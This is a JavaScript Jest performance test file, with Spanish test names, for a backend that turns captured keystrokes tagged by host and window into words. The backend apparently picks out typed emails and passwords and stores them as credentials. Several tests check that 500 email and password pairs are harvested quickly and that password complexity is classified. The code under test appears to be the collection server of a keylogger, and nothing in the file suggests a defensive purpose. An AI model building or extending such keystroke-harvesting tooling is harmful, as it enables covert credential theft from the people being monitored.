const mongoose = require('mongoose');
const { connect, disconnect } = require('./dbHelper');
const wordBuilder = require('../wordBuilder');
const Word = require('../models/Word');
const Credential = require('../models/Credential');

beforeAll(connect);
afterAll(disconnect);

afterEach(async () => {
  await wordBuilder.flushAll();
  wordBuilder.reset();
  const collections = mongoose.connection.collections;
  for (const key in collections) {
    await collections[key].deleteMany({});
  }
});

describe('Rendimiento - procesamiento de pulsaciones', () => {
  test('procesa 10.000 pulsaciones en menos de 500ms (sincrono)', async () => {
    const chars = 'abcdefghijklmnopqrstuvwxyz ';
    const start = Date.now();

    for (let i = 0; i < 10000; i++) {
      const key = chars[i % chars.length];
      wordBuilder.handleKey({
        host: 'perf-host',
        window: 'perf-window',
        key,
        timestamp: new Date()
      });
    }

    const elapsed = Date.now() - start;
    console.log(`10.000 handleKey: ${elapsed}ms`);
    expect(elapsed).toBeLessThan(500);

    const flushStart = Date.now();
    await wordBuilder.flushAll();
    const flushElapsed = Date.now() - flushStart;
    console.log(`flushAll tras 10k keys: ${flushElapsed}ms`);
    expect(flushElapsed).toBeLessThan(5000);
  });

  test('procesa 1.000 palabras completas y las guarda', async () => {
    const start = Date.now();

    for (let i = 0; i < 1000; i++) {
      const word = 'palabra' + i;
      for (const ch of word) {
        wordBuilder.handleKey({
          host: 'perf2',
          window: 'w',
          key: ch,
          timestamp: new Date()
        });
      }
      wordBuilder.handleKey({ host: 'perf2', window: 'w', key: ' ', timestamp: new Date() });
    }

    const elapsed = Date.now() - start;
    console.log(`1.000 palabras completas: ${elapsed}ms`);
    expect(elapsed).toBeLessThan(2000);

    await wordBuilder.flushAll();
    const count = await Word.countDocuments({ host: 'perf2' });
    console.log(`Palabras guardadas: ${count}`);
    expect(count).toBe(1000);
  });

  test('500 emails + passwords se detectan sin degradar rendimiento', async () => {
    const start = Date.now();

    for (let i = 0; i < 500; i++) {
      const email = `user${i}@test.com`;
      for (const ch of email) {
        wordBuilder.handleKey({ host: 'perf3', window: 'w', key: ch, timestamp: new Date() });
      }
      wordBuilder.handleKey({ host: 'perf3', window: 'w', key: ' ', timestamp: new Date() });
      for (const ch of 'pass123') {
        wordBuilder.handleKey({ host: 'perf3', window: 'w', key: ch, timestamp: new Date() });
      }
      wordBuilder.handleKey({ host: 'perf3', window: 'w', key: ' ', timestamp: new Date() });
    }

    const elapsed = Date.now() - start;
    console.log(`500 emails + passwords: ${elapsed}ms`);
    expect(elapsed).toBeLessThan(3000);

    await wordBuilder.flushAll();
    const count = await Credential.countDocuments({ host: 'perf3' });
    console.log(`Credenciales guardadas: ${count}`);
    expect(count).toBe(500);
  });

  test('clasificacion de complejidad no degrada rendimiento', async () => {
    const passwords = [
      'Simple',
      'abc123',
      'Abc123',
      'P@ssw0rd!',
    ];

    const start = Date.now();

    for (let i = 0; i < 2500; i++) {
      const pw = passwords[i % passwords.length] + i;
      for (const ch of pw) {
        wordBuilder.handleKey({ host: 'perf4', window: 'w', key: ch, timestamp: new Date() });
      }
      wordBuilder.handleKey({ host: 'perf4', window: 'w', key: ' ', timestamp: new Date() });
    }

    const elapsed = Date.now() - start;
    console.log(`2.500 palabras con clasificacion: ${elapsed}ms`);
    expect(elapsed).toBeLessThan(3000);
  });
});
